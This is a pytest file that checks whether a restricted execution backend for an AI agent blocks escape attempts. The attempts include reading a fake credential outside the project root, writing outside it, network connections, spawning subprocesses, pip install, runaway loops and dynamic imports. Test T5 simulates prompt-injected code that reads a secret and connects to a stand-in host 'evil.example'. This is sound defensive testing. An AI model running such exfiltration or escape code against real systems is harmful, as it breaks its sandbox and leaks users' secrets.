"""Escape tests: T1-T7 from docs/threat-model.md (M4-4).

Each test drives the restricted backend with code that attempts an escape and asserts
it is BLOCKED (structured failure), not that it succeeds or silently crashes. Real
subprocesses, temp allowed_root, no network, no real secrets (the "outside" file is a
temp file the test creates outside allowed_root).

Layering reminder (docs/threat-model.md): the AST static layer is advisory; real
enforcement is the restricted backend's audit hook + rlimit + timeout. These tests
assert the BACKEND blocks — the security boundary, not the static warnings.
"""

import sys

import pytest

from forgeagent.executor import RestrictedBackend
from forgeagent.policy import CodeAnalyzer
from forgeagent.runtime import Runtime


def _backend(tmp_path, **kw) -> RestrictedBackend:
    return RestrictedBackend(allowed_root=str(tmp_path), timeout_seconds=10.0, **kw)


def _blocked(result) -> bool:
    """A block is 'blocked' when it failed with a restriction/permission error."""
    if result.success:
        return False
    err = result.error or ""
    return any(
        marker in err
        for marker in ("restricted:", "PermissionError", "timed out", "denied")
    )


# --- T1: read secret outside project ----------------------------------------


def test_t1_read_secret_denied(tmp_path):
    secret = tmp_path.parent / "t1_secret.txt"
    secret.write_text("AKIA-fake-credential")
    try:
        code = f"print(open({str(secret)!r}).read())"
        assert _blocked(_backend(tmp_path).execute(code, Runtime()))
    finally:
        secret.unlink(missing_ok=True)


def test_t1_read_secret_via_pathlib_denied(tmp_path):
    # audit hook catches the low-level open event -> pathlib is covered (monkeypatch open
    # would have missed this).
    secret = tmp_path.parent / "t1_secret_pathlib.txt"
    secret.write_text("secret")
    try:
        code = f"from pathlib import Path\nprint(Path({str(secret)!r}).read_text())"
        assert _blocked(_backend(tmp_path).execute(code, Runtime()))
    finally:
        secret.unlink(missing_ok=True)


# --- T2: write outside project ----------------------------------------------


def test_t2_write_outside_denied(tmp_path):
    target = tmp_path.parent / "t2_should_not_exist.txt"
    code = f"open({str(target)!r}, 'w').write('pwned')"
    try:
        assert _blocked(_backend(tmp_path).execute(code, Runtime()))
        assert not target.exists()  # write never happened
    finally:
        target.unlink(missing_ok=True)


# --- T3: network egress ------------------------------------------------------


def test_t3_socket_connect_denied(tmp_path):
    code = (
        "import socket\n"
        "socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(('127.0.0.1', 9))"
    )
    assert _blocked(_backend(tmp_path).execute(code, Runtime()))


def test_t3_dns_denied(tmp_path):
    code = "import socket\nsocket.getaddrinfo('example.com', 443)"
    assert _blocked(_backend(tmp_path).execute(code, Runtime()))


# --- T3/T1 escape via subprocess (the spawn-block plugs this) ----------------


def test_t3_subprocess_spawn_denied(tmp_path):
    # Without the spawn block, this child would read files / reach the network outside
    # the audit hook. Assert spawn itself is denied.
    code = "import subprocess\nsubprocess.run(['echo', 'hi'])"
    assert _blocked(_backend(tmp_path).execute(code, Runtime()))


def test_t1_escape_via_os_system_denied(tmp_path):
    secret = tmp_path.parent / "t1_via_system.txt"
    secret.write_text("secret")
    try:
        code = f"import os\nos.system('cat {str(secret)}')"
        assert _blocked(_backend(tmp_path).execute(code, Runtime()))
    finally:
        secret.unlink(missing_ok=True)


# --- T4: runtime package install ---------------------------------------------


def test_t4_pip_install_blocked_by_backend(tmp_path):
    # T4's designed control is a 【流程】 ensure_packages confirmation gate, which is NOT
    # built in v1 (no ensure_packages runtime method yet). But in the restricted backend
    # a pip install is de facto blocked regardless: it needs subprocess spawn AND network,
    # both denied. This asserts that de facto enforcement (the confirmation gate remains
    # future work — see threat-model T4 / golden task G24).
    code = (
        "import subprocess, sys\n"
        "subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'])"
    )
    assert _blocked(_backend(tmp_path).execute(code, Runtime()))


# --- T5: prompt-injection-style off-task code still blocked by backend -------


def test_t5_injected_exfiltration_still_blocked(tmp_path):
    # Simulates code an injected instruction might produce: read a secret and POST it.
    # The backend blocks it regardless of why it was generated (defense not dependent
    # on the model resisting the injection).
    secret = tmp_path.parent / "t5_secret.txt"
    secret.write_text("secret")
    try:
        code = (
            "import socket\n"
            f"data = open({str(secret)!r}).read()\n"  # blocked here already
            "socket.socket().connect(('evil.example', 80))\n"
        )
        assert _blocked(_backend(tmp_path).execute(code, Runtime()))
    finally:
        secret.unlink(missing_ok=True)


# --- T6: runaway / long-running ----------------------------------------------


def test_t6_infinite_loop_timed_out(tmp_path):
    backend = RestrictedBackend(allowed_root=str(tmp_path), timeout_seconds=2.0)
    result = backend.execute("while True:\n    pass", Runtime())
    assert _blocked(result)
    assert "timed out" in (result.error or "")


def test_t6_next_block_survives_after_kill(tmp_path):
    backend = RestrictedBackend(allowed_root=str(tmp_path), timeout_seconds=2.0)
    rt = Runtime()
    backend.execute("while True:\n    pass", rt)
    ok = backend.execute("print('alive')", rt)
    assert ok.success is True
    assert ok.stdout.strip() == "alive"


def test_t6_fork_bomb_style_spawn_denied(tmp_path):
    # os.fork / spawn is denied, so a fork bomb cannot even start.
    code = "import os\nos.posix_spawn('/bin/echo', ['echo'], {})"
    assert _blocked(_backend(tmp_path).execute(code, Runtime()))


# --- T7: dynamic import bypass ----------------------------------------------


def test_t7_static_layer_flags_dynamic_import():
    # Static layer catches importlib.import_module (agent's known gap).
    result = CodeAnalyzer().analyze("import importlib\nimportlib.import_module('os')")
    assert any(i.rule == "dynamic-import" for i in result.issues)


def test_t7_backend_still_limits_even_if_static_missed(tmp_path):
    # Even if a dynamic import evades the static layer, the backend still limits what the
    # imported module can DO: here dynamically import os then try to read outside root.
    secret = tmp_path.parent / "t7_secret.txt"
    secret.write_text("secret")
    try:
        code = (
            "m = __import__('builtins')\n"
            f"print(m.open({str(secret)!r}).read())"
        )
        assert _blocked(_backend(tmp_path).execute(code, Runtime()))
    finally:
        secret.unlink(missing_ok=True)


# --- sanity: legitimate in-root work is NOT blocked --------------------------


def test_legit_work_in_root_not_blocked(tmp_path):
    # The boundary must not be so tight that normal in-root work fails.
    target = tmp_path / "ok.txt"
    code = f"open({str(target)!r}, 'w').write('fine')\nprint('done')"
    result = _backend(tmp_path).execute(code, Runtime())
    assert result.success is True
    assert result.stdout.strip() == "done"


@pytest.mark.skipif(sys.platform == "win32", reason="rlimit is Unix-only")
def test_t6_cpu_or_timeout_bounds_runaway(tmp_path):
    # Redundant safety: even a CPU-heavy (not infinite) loop is bounded by timeout.
    backend = RestrictedBackend(allowed_root=str(tmp_path), timeout_seconds=2.0)
    result = backend.execute("x = 0\nwhile True:\n    x += 1", Runtime())
    assert _blocked(result)
